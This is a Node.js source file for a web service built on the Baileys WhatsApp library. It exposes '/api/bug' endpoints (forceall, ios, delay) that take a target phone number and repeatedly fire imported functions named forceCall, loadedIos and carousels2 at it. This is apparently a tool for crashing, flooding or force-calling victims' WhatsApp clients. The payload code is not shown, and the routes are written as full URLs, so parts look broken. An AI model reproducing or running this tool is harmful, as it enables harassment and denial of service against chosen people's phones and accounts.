console.clear();
console.log('starting...');
process.on('uncaughtException', console.error);

const {
    default: makeWASocket,
    prepareWAMessageMedia,
    removeAuthState,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    makeInMemoryStore,
    generateWAMessageFromContent,
    generateWAMessageContent,
    generateWAMessage,
    jidDecode,
    proto,
    delay,
    relayWAMessage,
    getContentType,
    generateMessageTag,
    getAggregateVotesInPollMessage,
    downloadContentFromMessage,
    fetchLatestWaWebVersion,
    InteractiveMessage,
    makeCacheableSignalKeyStore,
    Browsers,
    generateForwardMessageContent,
    MessageRetryMap
} = require("@whiskeysockets/baileys");

const pino = require('pino');
const readline = require('readline');
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const { Boom } = require('@hapi/boom');

const { loadedIos, forceCall, carousels2 } = require('./public/service/bugs');

const app = express();
const PORT = 2006;

app.enable('trust proxy');
app.set('json spaces', 2);
app.use(cors());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));
app.use(bodyParser.raw({ limit: '50mb', type: '*/*' }));

const question = (text) => {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });
    return new Promise((resolve) => rl.question(text, (ans) => {
        rl.close();
        resolve(ans);
    }));
};

function getClientInfo(req) {
    return {
        ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown',
        method: req.method,
        timestamp: new Date().toISOString()
    };
}

async function startClient() {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const client = makeWASocket({
        version,
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        auth: state,
        browser: Browsers.ubuntu('Chrome')
    });

    if (!client.authState.creds.registered) {
        const phone = await question('Enter your WhatsApp number (start with country code, e.g. 62…):\n> ');
        const pairingCode = await client.requestPairingCode(phone, 'PRIMROSE');
        console.log(`Pair this device using code: ${pairingCode}`);
    }

    app.get('https://website-bug-waysmodzx.up.railway.app/api/bug/forceall', async (req, res) => {
        const { target } = req.query;
        if (!target) return res.status(400).json({ status: false, message: 'parameter target diperlukan' });

        const sanitized = String(target).replace(/[^0-9]/g, '');
        if (sanitized.startsWith('0')) return res.json('gunakan awalan kode negara!');

        const jid = sanitized + '@s.whatsapp.net';
        const info = getClientInfo(req);

        try {
            await carousels2(client, jid);
            await forceCall(client, jid);
            await forceCall(client, jid);
            await carousels2(client, jid);
            console.log(`[ForceCall] target=${jid} ip=${info.ip} time=${info.timestamp}`);
            res.json({ status: true, result: 'sukses' });
        } catch (err) {
            console.error(err);
            res.status(500).json({ status: false, error: err.message });
        }
    });

   app.get('https://website-bug-waysmodzx.up.railway.app/api/bug/ios', async (req, res) => {
        const { target } = req.query;
        if (!target) return res.status(400).json({ status: false, message: 'parameter target diperlukan' });

        const sanitized = String(target).replace(/[^0-9]/g, '');
        if (sanitized.startsWith('0')) return res.json('gunakan awalan kode negara!');

        const jid = sanitized + '@s.whatsapp.net';
        const info = getClientInfo(req);

        try {
            await carousels2(client, jid);
            await forceCall(client, jid);
            await loadedIos(client, jid);
            await loadedIos(client, jid);
            await forceCall(client, jid);
            await carousels2(client, jid);
            console.log(`[Carousels] target=${jid} ip=${info.ip} time=${info.timestamp}`);
            res.json({ status: true, result: 'sukses' });
        } catch (err) {
            console.error(err);
            res.status(500).json({ status: false, error: err.message });
        }
    });

    app.get('https://website-bug-waysmodzx.up.railway.app/api/bug/delay', async (req, res) => {
        const { target } = req.query;
        if (!target) return res.status(400).json({ status: false, message: 'parameter target diperlukan' });

        const sanitized = String(target).replace(/[^0-9]/g, '');
        if (sanitized.startsWith('0')) return res.json('gunakan awalan kode negara!');

        const jid = sanitized + '@s.whatsapp.net';
        const info = getClientInfo(req);

        try {
            await carousels2(client, jid);
            await carousels2(client, jid);
            console.log(`[Carousels] target=${jid} ip=${info.ip} time=${info.timestamp}`);
            res.json({ status: true, result: 'sukses' });
        } catch (err) {
            console.error(err);
            res.status(500).json({ status: false, error: err.message });
        }
    });

    client.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            const reason = new Boom(lastDisconnect?.error)?.output.statusCode;
            if (reason === DisconnectReason.badSession) {
                console.log('Bad session file, hapus folder session dan scan ulang');
                process.exit(0);
            } else if (
                reason === DisconnectReason.connectionClosed ||
                reason === DisconnectReason.connectionLost ||
                reason === DisconnectReason.timedOut ||
                reason === DisconnectReason.restartRequired
            ) {
                console.log('Koneksi terputus, mencoba reconnect...');
                startClient();
            } else if (reason === DisconnectReason.connectionReplaced) {
                console.log('Koneksi digantikan sesi lain, restart bot!');
                process.exit(0);
            } else if (reason === DisconnectReason.loggedOut) {
                console.log('Device logout, hapus session dan scan ulang!');
                process.exit(0);
            } else {
                console.log(`Disconnect dengan alasan tidak diketahui: ${reason}`);
                startClient();
            }
        } else if (connection === 'open') {
            console.log('Device connected successfully.');
        }
    });

    client.ev.on('creds.update', saveCreds);

    return client;
}

startClient().catch(console.error);

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'primrose.html'));
});

const server = app.listen(PORT, () => {
    console.log(`Server running → http://priv.waysmodzzsite.my.id:${PORT}`);
});

server.on('error', (err) => {
    if (err.code === 'EADDRINUSE') {
        console.error(`Port ${PORT} in use. Retrying...`);
        const newPort = Math.floor(Math.random() * (65535 - 1024) + 1024);
        app.listen(newPort, () => console.log(`Server running → http://priv.waysmodzzsite.my.id:${newPort}`));
    } else {
        console.error('Server error:', err.message);
    }
});

const thisFile = __filename;
fs.watchFile(thisFile, () => {
    fs.unwatchFile(thisFile);
    console.log(`\x1b[32m${thisFile} updated – restarting...\x1b[0m`);
    delete require.cache[thisFile];
    require(thisFile);
});
